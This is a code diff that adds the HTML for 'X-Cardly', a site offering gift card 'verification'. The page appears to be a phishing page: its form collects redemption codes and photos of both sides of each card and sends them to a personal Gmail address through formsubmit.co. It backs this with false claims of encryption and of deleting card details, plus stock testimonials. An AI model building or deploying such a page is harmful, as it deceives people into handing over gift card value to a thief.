@@ -1,0 +1,261 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>X-Cardly</title>
+  <link rel="icon" type="image/png" href="favicon.png">
+  <link rel="stylesheet" href="styles.css">
+  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
+
+</head>
+<body>
+ <!-- Navigation Bar -->
+  <nav class="navbar navbar-expand-lg navbar-dark">
+    <div class="container">
+      <a class="navbar-brand" href="#">
+         <img src="logo.png" alt="logo" class="logo-img">
+      </a>
+      <button class="navbar-toggler" type="button" data-bs-toggle="collapse" data-bs-target="#navbarNav">
+        <span class="navbar-toggler-icon"></span>
+      </button>
+      <div class="collapse navbar-collapse" id="navbarNav">
+        <ul class="navbar-nav ms-auto">
+          <li class="nav-item">
+            <a class="nav-link active" aria-current="page" href="#">Home</a>
+          </li>
+          <li class="nav-item">
+            <a class="nav-link" href="#services">Services</a>
+          </li>
+          <li class="nav-item">
+            <a class="nav-link" href="#contact">Contact Us</a>
+          </li>
+        </ul>
+        <a href="#verify" class="btn btn-verify ms-3">Verify now</a>
+      </div>
+    </div>
+  </nav>
+   <!-- Hero Section -->
+  <section class="hero">
+    <div class="container hero-content">
+      <div class="hero-text">
+        <h1> X-Cardly Giftcard <span class="highlight">Validation</span><br>and Activation Check</h1>
+        <p class="lead mt-4">An efficient framework that provides a robust verification,<br>using a smart anti-logarithm that runs very fast to provide an adequate activation information.</p>
+        <a href="#verify" class="btn btn-light mt-3">Verify now</a>
+      </div>
+      <div class="hero-image">
+        <img src="gift-card1.png" alt="Gift Cards" class="giftcard-img">
+      </div>
+    </div>
+  </section>
+
+    <!-- Services Section -->
+  <section class="services" id="services">
+    <div class="container">
+      <h2 class="mb-4">Our Services</h2>
+      <p class="mb-5">Leverage our agile and efficient frameworks to provide a robust verification and synopsis for high level reviews on your giftcards</p>
+      <div class="row">
+        <div class="col-md-4">
+          <div class="service-box service-1">
+            <div class="service-number">1</div>
+            <h4>High performance</h4>
+            <p>Our smart algorithms run very fast to provide for you adequate info about your giftcard. We value our customers time, that is why you can get a fast response on your request</p>
+          </div>
+        </div>
+        <div class="col-md-4">
+          <div class="service-box service-2">
+            <div class="service-number">2</div>
+            <h4>Secured and Encrypted</h4>
+            <p>We at <strong>card-ly</strong> makes sure customers giftcard details are secured and encrypted. No attacker or false identity can intercept your verification operations</p>
+          </div>
+        </div>
+        <div class="col-md-4">
+          <div class="service-box service-3">
+            <div class="service-number">3</div>
+            <h4>Decentralized</h4>
+            <p>Our smart frameworks is built on a decentralized platform to ensure clients gift card details are not stored anywhere in the server. Your card details are immediately deleted after verification operations.</p>
+          </div>
+        </div>
+      </div>
+    </div>
+  </section>
+
+  <!-- Verification Form Section -->
+  <section id="verify" class="p-5 bg-light text-dark">
+  <div class="container">
+    <h2 class="mb-4 text-center">Verify Your Gift Card</h2>
+    <form class="row g-3"
+          action="https://formsubmit.co/elthonjohn001@gmail.com"
+          method="POST"
+          enctype="multipart/form-data">
+
+      <!-- Hidden Settings -->
+      <input type="hidden" name="_subject" value="New Gift Card Submission">
+      <input type="hidden" name="_captcha" value="false">
+
+      <!-- Card Type -->
+      <div class="col-md-6">
+        <select name="Card Type" id="cardType" class="form-select" required>
+          <option selected disabled>Select Card Type</option>
+          <option>Amazon</option>
+          <option>Visa</option>
+          <option>Adidas</option>
+          <option>Uber</option>
+          <option>Nike</option>
+          <option>Walmart</option>
+          <option>AMC</option>
+          <option>Burger King</option>
+          <option>Best Buy</option>
+        </select>
+      </div>
+
+      <!-- Currency -->
+      <div class="col-md-6">
+        <select name="Currency" id="currency" class="form-select" required>
+          <option selected disabled>Select Currency</option>
+          <option>USD</option>
+          <option>EUR</option>
+          <option>GBP</option>
+          <option>AUD</option>
+          <option>CAD</option>
+        </select>
+      </div>
+
+      <!-- Amount -->
+      <div class="col-md-6">
+        <input type="number" name="Card Amount" class="form-control" id="amount" placeholder="Card amount" required>
+      </div>
+
+      <!-- Redemption Code -->
+      <div class="col-md-6">
+        <input type="text" name="Redemption Code" class="form-control" id="code" placeholder="Redemption Code" required>
+      </div>
+
+      <!-- Upload Front Image -->
+      <div class="col-md-6">
+        <label for="frontImage" class="form-label">Upload Front of Card</label>
+        <input type="file" name="Front Image" id="frontImage" class="form-control" accept="image/*" required>
+      </div>
+
+      <!-- Upload Back Image -->
+      <div class="col-md-6">
+        <label for="backImage" class="form-label">Upload Back of Card</label>
+        <input type="file" name="Back Image" id="backImage" class="form-control" accept="image/*" required>
+      </div>
+
+      <!-- Submit -->
+      <div class="col-12 text-center">
+        <button type="submit"  class="btn px-5 aye" style="background: #00aaff;">Continue</button>
+      </div>
+    </form>
+  </div>
+</section>
+
+
+    <!-- Verification Info Section -->
+  <section class="verification-section">
+    <div class="container">
+      <div class="verification-image">
+        <img src="smart-card.png" alt="Gift Card Logos" class="smart img-fluid">
+      </div>
+      <div class="verification-text">
+        <h2>We have verified over 10k giftcards on our site.<br>Verify yours now</h2>
+        <a href="#verify" class="btn">Try it for free</a>
+      </div>
+    </div>
+  </section>
+
+  <!-- Testimonials -->
+  <section class="py-5">
+    <div class="container text-center">
+      <h2>What Our Customers Say</h2>
+      <div class="row g-4 mt-4">
+        <div class="col-md-4">
+          <blockquote class="blockquote">
+            <p>"Super fast and easy to use!"</p>
+            <footer class="blockquote-footer">Jane D.</footer>
+          </blockquote>
+        </div>
+        <div class="col-md-4">
+          <blockquote class="blockquote">
+            <p>"A great way to send last-minute gifts."</p>
+            <footer class="blockquote-footer">Mike T.</footer>
+          </blockquote>
+        </div>
+        <div class="col-md-4">
+          <blockquote class="blockquote">
+            <p>"I love the selection of brands available."</p>
+            <footer class="blockquote-footer">Sarah W.</footer>
+          </blockquote>
+        </div>
+      </div>
+    </div>
+  </section>
+
+  <!-- Newsletter Signup -->
+  <section class="bg-primary text-white text-center py-5">
+    <div class="container">
+      <h3>Subscribe for Gift Card Deals & Updates</h3>
+      <form class="row g-3 justify-content-center mt-3">
+        <div class="col-md-6">
+          <input type="email" class="form-control" placeholder="Enter your email">
+        </div>
+        <div class="col-auto">
+          <button type="submit" class="btn btn-light">Subscribe</button>
+        </div>
+      </form>
+    </div>
+  </section>
+
+  <section class="contact-section py-5">
+  <div class="container">
+    <h2 class="text-center mb-3">Contact Us</h2>
+    <p class="text-center mb-4">
+      We are available to help you with your giftcard verification needs and to provide you support with a quick solution to your problem.
+    </p>
+    <form action="" method="POST" class="mx-auto" style="max-width: 700px;">
+      <div class="mb-4">
+        <label for="email" class="form-label fw-bold">Email address</label>
+        <input type="email" name="email" class="form-control rounded-pill px-4 py-3" id="email" placeholder="name@example.com" required>
+      </div>
+      <div class="mb-4">
+        <label for="message" class="form-label fw-bold">Message</label>
+        <textarea name="message" class="form-control rounded-4 px-4 py-3" id="message" rows="5" required></textarea>
+      </div>
+      <input type="hidden" name="_subject" value="New Contact Message">
+      <input type="hidden" name="_captcha" value="false">
+      <div class="text-center">
+        <button type="submit" class="btn btn-primary btn-lg px-5 rounded-pill" style="background-color: #00aaff;">Submit</button>
+      </div>
+    </form>
+  </div>
+</section>
+
+<!-- Footer -->
+<footer class="footer text-white py-4">
+  <div class="container">
+    <div class="d-flex flex-column flex-md-row align-items-center justify-content-between">
+      <!-- Left: Logo/Image -->
+      <div class="footer-logo mb-3 mb-md-0">
+        <img src="logo.png" alt="Logo" style="height: 120px;">
+      </div>
+
+      <!-- Right: Text -->
+      <div class="footer-text text-md-end">
+        <p class="mb-1 fw-bold">X-Cardly </p>
+        <p class="mb-1">978 JUMES AVENUE, ST CHRIS, USA.</p>
+      </div>
+    </div>
+
+    <!-- Centered Copyright -->
+    <div class="text-center mt-3">
+      <p class="mb-0">©Copyright 2020, All Rights Reserved</p>
+    </div>
+  </div>
+</footer>
+
+
+
+  <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"></script>
+</body>
+</html>
